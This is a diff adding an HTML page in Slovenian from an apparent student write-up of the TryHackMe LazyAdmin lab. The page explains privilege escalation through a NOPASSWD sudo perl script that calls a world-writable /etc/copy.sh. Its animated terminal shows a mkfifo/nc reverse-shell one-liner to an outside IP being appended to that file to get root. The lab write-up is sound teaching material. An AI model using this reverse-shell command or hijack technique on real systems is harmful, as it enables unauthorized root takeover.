@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="sl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Faza 3 – Dvig pravic | Lazy Admin Project</title>
+  <link rel="stylesheet" href="../style/style.css" />
+</head>
+<body>
+  <header>
+    <div class="logo">⚡ THM Project – LazyAdmin</div>
+    <nav>
+      <a href="../index.html">Domov</a>
+      <a href="reconnaissance.html">Faze napada</a>
+      <a href="../tools/index.html">Orodja</a>
+      <a href="../report.html">Attack Report</a>
+    </nav>
+  </header>
+    <div class="progress-container">
+        <div class="progress-bar" id="phase-progress"></div>
+    </div>
+
+  <section class="intro">
+    <h1>Faza 3 – Dvig pravic (Privilege Escalation)</h1>
+
+    <p>
+      V tej fazi preizkusimo, ali lahko uporabnik, ki je dobil osnovni dostop,
+      pridobi <strong>skrbniške ali root pravice</strong>.  
+      Analiza v okviru LazyAdmin pokaže, kako napačne konfiguracije ali slabi skripti v sistemu 
+      omogočajo izvajanje dejanj, ki niso namenjena navadnim uporabnikom.
+    </p>
+
+    <h2>Opis cilja</h2>
+    <p>
+      Dvig pravic (Privilege Escalation) je namenjen preverjanju, ali so notranji mehanizmi operacijskega sistema varno nastavljeni. 
+      Cilj je pokazati, kako lahko nepravilne pravice datotek ali storitve vodijo do prevzema nadzora nad celotnim sistemom.
+    </p>
+
+    <div class="alert-box alert-info">
+      <h4>💡 Koncept: Načelo najmanjših privilegijev (Least Privilege)</h4>
+      <p>
+        To je temeljni varnostni koncept, ki narekuje, da mora vsak sistem, proces ali uporabnik imeti samo tiste privilegije, ki jih nujno potrebuje za opravljanje svojega dela. Pri tarči LazyAdmin je to načelo hudo prekršeno, saj je spletnemu uporabniku <code>www-data</code> dovoljeno izvajati varnostne kopije s skrbniškimi (sudo) pravicami brez preverjanja gesla.
+      </p>
+    </div>
+
+    <h2>Orodja in pristopi</h2>
+    <ul>
+      <li>Lastnoročno preverjanje pravic (`sudo -l`, `id`, `whoami`).</li>
+      <li>Pregled lokalnih skript in konfiguracijskih datotek za gesla ali token‑e.</li>
+      <li>Uporaba namenjenih skript za pregled pravic (LinPEAS, pspy ipd.).</li>
+    </ul>
+
+    <h2>Postopek analize</h2>
+    <div class="screenshot-box">
+      <h3>Pregled pravic uporabnika</h3>
+      <p>
+        Ukaz <code>sudo -l</code> pokaže, da lahko uporabnik izvaja perl skripto pod potjo <code>/home/itguy/backup.pl</code> brez vnosa gesla (NOPASSWD).
+      </p>
+        <div class="terminal-window animated-terminal" data-lines='[
+            {"type": "input", "text": "sudo -l", "delayAfter": 1000},
+            {"type": "output", "text": "Matching Defaults entries for www-data on lazyadmin:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on lazyadmin:\n    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl", "delayAfter": 2000}
+        ]'>
+          <div class="terminal-header">
+            <div class="terminal-buttons">
+              <div class="terminal-button close"></div>
+              <div class="terminal-button minimize"></div>
+              <div class="terminal-button maximize"></div>
+            </div>
+            <div class="terminal-title">www-data@lazyadmin: /</div>
+          </div>
+          <div class="terminal-body">
+            <!-- Animated by JS -->
+          </div>
+        </div>
+        
+      <p class="caption">Animacija 1 – Odkrivanje pomanjkljivo nastavljenih sudo privilegijev (simulirano).</p>
+    </div>
+
+    <div class="alert-box alert-critical">
+      <h4>🚨 Koncept: Ugrabitev izvajanja preko zapisljive datoteke (Writable File Hijacking)</h4>
+      <p>
+        Ko nadrejena skripta (<code>backup.pl</code>), ki se izvaja s <strong>sudo</strong> pravicami, znotraj sebe kliče drugo, podrejeno datoteko (<code>/etc/copy.sh</code>), se ustvari močna odvisnost. Če ima ta podrejena datoteka slabe pravice dostopa in jo lahko vsakdo ureja (angl. <em>world-writable</em>), lahko napadalec vanjo vpiše lastne zlonamerne ukaze. Sistem jih nato prebere in izvede z najvišjimi (root) privilegiji.
+      </p>
+    </div>
+
+    <div class="screenshot-box">
+      <h3>Izkoriščanje odvisne skripte (Writable File)</h3>
+      <p>
+        Analiza izvorne kode <code>backup.pl</code> razkrije, da znotraj sebe izvaja še eno datoteko: <code>/etc/copy.sh</code>.
+        S preverjanjem pravic datoteke (<code>ls -la /etc/copy.sh</code>) ugotovimo, da imamo pravico urejanja. Vstavimo lastni ukaz za povrnitev povezave (Root Reverse Shell) in s tem prevzamemo nadzor nad strojem!
+      </p>
+        <div class="terminal-window animated-terminal" data-lines='[
+            {"type": "input", "text": "echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.5 5555 >/tmp/f\" >> /etc/copy.sh", "delayAfter": 1500},
+            {"type": "input", "text": "sudo /usr/bin/perl /home/itguy/backup.pl", "delayAfter": 2000},
+            {"type": "output", "text": "root@lazyadmin:~# ", "delayAfter": 500},
+            {"type": "input", "text": "whoami", "delayAfter": 800},
+            {"type": "output", "text": "root", "delayAfter": 1000}
+        ]'>
+          <div class="terminal-header">
+            <div class="terminal-buttons">
+              <div class="terminal-button close"></div>
+              <div class="terminal-button minimize"></div>
+              <div class="terminal-button maximize"></div>
+            </div>
+            <div class="terminal-title">www-data@lazyadmin: /</div>
+          </div>
+          <div class="terminal-body">
+            <!-- Animated by JS -->
+          </div>
+        </div>
+        
+      <p class="caption">Animacija 2 – Ponazoritev urejanja <code>/etc/copy.sh</code> in pridobitev root dostopa (simulirano zgoraj).</p>
+    </div>
+
+    <h2>Povzetek faze</h2>
+    <p>
+      Uspeli smo dokazati, kako nevarna je kombinacija napačno dodeljenih <code>sudo</code> pravic in javno zapisljive odvisne datoteke (<code>/etc/copy.sh</code>). Napadalec je s tem izkoristil t.i. verigo zaupanja in eskaliral svoje pravice od povprečnega spletnega servisa (<code>www-data</code>) do popolnega lastnika sistema (<code>root</code>). To neposredno potrjuje kritičen pomen stroge presoje pri dodeljevanju pooblastil v celotnem sistemu.
+    </p>
+
+    <div class="nav-buttons">
+      <a href="exploitation.html" class="button">⬅ Nazaj – Izkoriščanje</a>
+      <a href="defense.html" class="button">➡ Naprej – Zaščita in zaključek</a>
+    </div>
+  </section>
+
+  <footer>
+    <p>&copy; 2024 Denis Pilipovic | THM – LazyAdmin Project | Faza 3 – Dvig pravic</p>
+  </footer>
+
+    <script>
+        setTimeout(() => {
+            const progressBar = document.getElementById('phase-progress');
+            let target = 0;
+            if (location.href.includes('reconnaissance')) target = 25;
+            if (location.href.includes('exploitation'))   target = 50;
+            if (location.href.includes('privilege'))      target = 75;
+            if (location.href.includes('defense'))        target = 100;
+            if (progressBar) progressBar.style.width = target + '%';
+        }, 100);
+    </script>
+    <script src="../style/terminal.js"></script>
+    <script src="../style/hacker.js"></script>
+</body>
+</html>
